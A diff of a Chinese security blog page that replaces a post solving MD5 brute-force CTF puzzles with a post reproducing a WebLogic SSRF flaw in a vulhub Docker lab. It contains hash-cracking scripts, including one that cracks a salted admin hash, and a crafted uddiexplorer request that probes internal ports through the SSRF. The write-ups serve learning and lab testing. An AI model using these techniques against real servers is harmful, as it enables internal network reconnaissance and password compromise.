@@ -3,22 +3,22 @@
 <head>
   <meta charset="utf-8">
   
-  <title>MD5 爆破问题 | Archimesan</title>
+  <title>weblogic ssrf 漏洞复现 | Archimesan</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="几道 MD5 爆破问题">
-<meta name="keywords" content="ctf">
+  <meta name="description" content="Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。">
+<meta name="keywords" content="常见漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MD5 爆破问题">
-<meta property="og:url" content="http://archimesan.me/2017/12/24/MD5爆破问题/index.html">
+<meta property="og:title" content="weblogic ssrf 漏洞复现">
+<meta property="og:url" content="http://archimesan.me/2018/02/02/weblogic ssrf 漏洞复现/index.html">
 <meta property="og:site_name" content="Archimesan">
-<meta property="og:description" content="几道 MD5 爆破问题">
-<meta property="og:image" content="http://archimesan.me/2017/12/24/MD5爆破问题/1_1.png">
-<meta property="og:image" content="http://archimesan.me/2017/12/24/MD5爆破问题/1_2.png">
-<meta property="og:updated_time" content="2017-12-28T08:38:53.591Z">
+<meta property="og:description" content="Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。">
+<meta property="og:image" content="http://archimesan.me/2018/02/02/weblogic%20ssrf%20漏洞复现/1.png">
+<meta property="og:image" content="http://archimesan.me/2018/02/02/weblogic%20ssrf%20漏洞复现/2.png">
+<meta property="og:updated_time" content="2018-02-07T08:32:57.602Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MD5 爆破问题">
-<meta name="twitter:description" content="几道 MD5 爆破问题">
-<meta name="twitter:image" content="http://archimesan.me/2017/12/24/MD5爆破问题/1_1.png">
+<meta name="twitter:title" content="weblogic ssrf 漏洞复现">
+<meta name="twitter:description" content="Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。">
+<meta name="twitter:image" content="http://archimesan.me/2018/02/02/weblogic%20ssrf%20漏洞复现/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Archimesan" type="application/atom+xml">
   
@@ -228,11 +228,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-MD5爆破问题" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-weblogic ssrf 漏洞复现" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/12/24/MD5爆破问题/" class="article-date">
-      <time datetime="2017-12-24T12:18:20.000Z" itemprop="datePublished">2017-12-24</time>
+      <a href="/2018/02/02/weblogic ssrf 漏洞复现/" class="article-date">
+      <time datetime="2018-02-02T07:41:23.000Z" itemprop="datePublished">2018-02-02</time>
 </a>
     </div>
   
@@ -245,7 +245,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      MD5 爆破问题
+      weblogic ssrf 漏洞复现
     </h1>
   
 
@@ -256,7 +256,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/常见漏洞/">常见漏洞</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -266,21 +266,18 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>几道 MD5 爆破问题</p>
+        <p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
 <a id="more"></a>
-<h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p>md5多一位</p>
-<p><img src="1_1.png" alt=""></p>
-<p>代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mymd5=<span class="string">"d78b6f302l25cdc811adfe8d4e7c9fd34"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(33):</span><br><span class="line">    newmd5=mymd5[:i]+mymd5[i+1:]</span><br><span class="line">    <span class="built_in">print</span> newmd5</span><br></pre></td></tr></table></figure></p>
-<p>难道是逐个解密？？</p>
-<p>不对。</p>
-<p>MD5 包含0-9a-f共16个字符，不存在 l </p>
-<p>很明显应该去掉 l </p>
-<p>对 “d78b6f30225cdc811adfe8d4e7c9fd34” 进行解密即可。</p>
-<p><img src="1_2.png" alt=""></p>
-<h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><p>代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">def <span class="built_in">test</span>():</span><br><span class="line">    count=0</span><br><span class="line">    md5=<span class="string">'38e4c352809e150186920aac37190cbc'</span></span><br><span class="line">    str=<span class="string">'flag&#123;www_shiyanbar_com_is_very_good_'</span></span><br><span class="line">    <span class="keyword">while</span> count==0:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">            a=chr(i)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">                b=chr(i)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">                    c=chr(i)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> range(32,127):</span><br><span class="line">                        d=chr(i)</span><br><span class="line">                        <span class="built_in">test</span>=str+a+b+c+d+<span class="string">'&#125;'</span></span><br><span class="line">                        m=hashlib.md5()</span><br><span class="line">                        m.update(<span class="built_in">test</span>)</span><br><span class="line">                        m=m.hexdigest()</span><br><span class="line">                        <span class="keyword">if</span>(cmp(m,md5)==0):</span><br><span class="line">                             count=1</span><br><span class="line">                             <span class="built_in">print</span> <span class="string">'ok'</span></span><br><span class="line">                             <span class="built_in">print</span> <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">test</span>()</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure></p>
-<h2 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h2><p>md5加盐爆破</p>
-<p>题目：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have found a passwd file containing salted passwords. An unprotected configuration file has revealed a salt of 5948. The hashed password <span class="keyword">for</span> the <span class="string">'admin'</span> user appears to be 81bdf501ef206ae7d3b92070196f7e98, try to brute force this password.</span><br></pre></td></tr></table></figure></p>
-<p>python 脚本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf -*-</span></span><br><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    f=open(<span class="string">'1.txt'</span>,<span class="string">'rb'</span>).readlines()</span><br><span class="line">    salt=<span class="string">'5948'</span></span><br><span class="line">    m=<span class="string">'81bdf501ef206ae7d3b92070196f7e98'</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        t=line.strip()+salt</span><br><span class="line">        t=md5(t).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t==m:</span><br><span class="line">            <span class="built_in">print</span> line.strip()</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'ok'</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h1><h2 id="docker搭建"><a href="#docker搭建" class="headerlink" title="docker搭建"></a>docker搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br></pre></td></tr></table></figure>
+<p>编译及启动测试环境<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
+<p>访问 <a href="http://your-ip:7001/uddiexplorer/，无需登录即可查看" target="_blank" rel="noopener">http://your-ip:7001/uddiexplorer/，无需登录即可查看</a> uddiexplorer 应用。</p>
+<h1 id="SSRF漏洞测试"><a href="#SSRF漏洞测试" class="headerlink" title="SSRF漏洞测试"></a>SSRF漏洞测试</h1><p>SSRF漏洞存在于 <a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，我们在" target="_blank" rel="noopener">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，我们在</a> brupsuite 下测试该漏洞。访问一个可以访问的 IP:PORT，如 <a href="http://127.0.0.1:80" target="_blank" rel="noopener">http://127.0.0.1:80</a></p>
+<p>访问：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.30.146:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:7000/uddi&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure></p>
+<p><img src="1.png" alt=""></p>
+<p>修改为一个不存在的端口，将会返回could not connect over HTTP to server。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.30.146:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:7000/uddi&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure>
+<p><img src="2.png" alt=""></p>
+<p>通过错误的不同，即可探测内网状态。</p>
 
       
       
@@ -336,13 +333,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/12/24/MD5爆破问题/">MD5 爆破问题</a></p>
+        <p><span>本文标题:</span><a href="/2018/02/02/weblogic ssrf 漏洞复现/">weblogic ssrf 漏洞复现</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Archimesan 的个人博客">Archimesan</a></p>
-        <p><span>发布时间:</span>2017年12月24日 - 20时18分</p>
-        <p><span>最后更新:</span>2017年12月28日 - 16时38分</p>
+        <p><span>发布时间:</span>2018年02月02日 - 15时41分</p>
+        <p><span>最后更新:</span>2018年02月07日 - 16时32分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/12/24/MD5爆破问题/" title="MD5 爆破问题">http://archimesan.me/2017/12/24/MD5爆破问题/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://archimesan.me/2017/12/24/MD5爆破问题/　　作者: Archimesan" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/02/02/weblogic ssrf 漏洞复现/" title="weblogic ssrf 漏洞复现">http://archimesan.me/2018/02/02/weblogic ssrf 漏洞复现/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://archimesan.me/2018/02/02/weblogic ssrf 漏洞复现/　　作者: Archimesan" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -355,18 +352,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2017/12/25/序列化漏洞/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2018/02/02/WebLogic XMLDecoder 反序列化漏洞复现/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          序列化漏洞
+          WebLogic XMLDecoder反序列化漏洞复现
         
       </div>
     </a>
   
   
-    <a href="/2017/12/23/hash长度扩展攻击/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">hash长度扩展攻击</div>
+    <a href="/2018/02/01/西普实验吧-web/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">西普实验吧-web</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -377,7 +374,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目1"><span class="toc-number">1.</span> <span class="toc-text">题目1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目2"><span class="toc-number">2.</span> <span class="toc-text">题目2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目3"><span class="toc-number">3.</span> <span class="toc-text">题目3</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#测试环境搭建"><span class="toc-number">1.</span> <span class="toc-text">测试环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#docker搭建"><span class="toc-number">1.1.</span> <span class="toc-text">docker搭建</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF漏洞测试"><span class="toc-number">2.</span> <span class="toc-text">SSRF漏洞测试</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -443,13 +440,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/12/25/序列化漏洞/" title="上一篇: 序列化漏洞">
+            <a href="/2018/02/02/WebLogic XMLDecoder 反序列化漏洞复现/" title="上一篇: WebLogic XMLDecoder反序列化漏洞复现">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2017/12/23/hash长度扩展攻击/" title="下一篇: hash长度扩展攻击">
+            <a href="/2018/02/01/西普实验吧-web/" title="下一篇: 西普实验吧-web">
                 <i class="fa fa-angle-right"></i>
             </a>
         
